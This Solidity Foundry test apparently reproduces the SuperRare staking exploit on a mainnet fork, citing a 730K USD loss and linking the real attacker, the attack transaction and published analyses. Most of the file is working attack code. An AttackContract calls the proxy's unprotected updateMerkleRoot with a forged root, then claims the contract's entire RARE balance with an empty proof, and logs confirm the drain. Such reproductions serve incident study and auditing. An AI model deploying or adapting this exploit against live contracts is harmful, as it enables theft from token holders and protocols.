// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 730K USD
// Attacker : https://etherscan.io/address/0x5b9b4b4dafbcfceea7afba56958fcbb37d82d4a2
// Attack Contract : https://etherscan.io/address/0x08947cedf35f9669012bda6fda9d03c399b017ab
// Vulnerable Contract : https://etherscan.io/address/0xfFB512B9176D527C5D32189c3e310Ed4aB2Bb9eC
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0xd813751bfb98a51912b8394b5856ae4515be6a9c6e5583e06b41d9255ba6e3c1

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xfFB512B9176D527C5D32189c3e310Ed4aB2Bb9eC#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/SlowMist_Team/status/1949770231733530682
// Hacking God : https://blog.solidityscan.com/superrare-hack-analysis-488d544d89e0
pragma solidity ^0.8.0;

address constant ERC1967Proxy = 0x3f4D749675B3e48bCCd932033808a7079328Eb48;
address constant RARE_TOKEN = 0xba5BDe662c17e2aDFF1075610382B9B691296350;
address constant ATTACKER = 0x5B9B4B4DaFbCfCEEa7aFbA56958fcBB37d82D4a2;
address constant ATTACK_CONTRACT = 0x08947cedf35f9669012bDA6FdA9d03c399B017Ab;

// 1753690919
contract SuperRare is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 23016423 - 1;

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = RARE_TOKEN;
    }

    function testExploit() public balanceLog {
        // deploy attack contract and etch it to ATTACK_CONTRACT address
        AttackContract acTemp = new AttackContract();
        bytes memory code = address(acTemp).code;
        vm.etch(ATTACK_CONTRACT, code);
        AttackContract ac = AttackContract(ATTACK_CONTRACT);

        uint256 stakingContractBalance = ac.getStakingContractBalance();
        console.log("stakingContractBalance", stakingContractBalance);
        // 11907874713019104529057960
    
        uint256 tokenBalance = ac.getTokenBalance();
        console.log("attackContract Balance Before", tokenBalance);
        // 0

        bytes32 fakeRoot = 0x93f3c0d0d71a7c606fe87524887594a106b44c65d46fa72a42d80bd6259ade7e;
        ac.attack(fakeRoot, stakingContractBalance);

        uint256 tokenBalanceAfter = ac.getTokenBalance();
        console.log("attackContract Balance After", tokenBalanceAfter);
        // 11907874713019104529057960
    }
}

contract AttackContract {
    function getStakingContractBalance() public view returns (uint256) {
        return IERC20(RARE_TOKEN).balanceOf(ERC1967Proxy);
    }
    function getTokenBalance() public view returns (uint256) {
        return IERC20(RARE_TOKEN).balanceOf(address(this));
    }
    function attack(bytes32 newRoot, uint256 amout) public {
        IERC1967Proxy target = IERC1967Proxy(ERC1967Proxy);
        target.updateMerkleRoot(newRoot);
        bytes32[] memory proof = new bytes32[](0);
        target.claim(amout, proof);
    }
}

interface IERC1967Proxy {
    function updateMerkleRoot(bytes32 newRoot) external;
    function claim(uint256 amount, bytes32[] calldata proof) external;
}
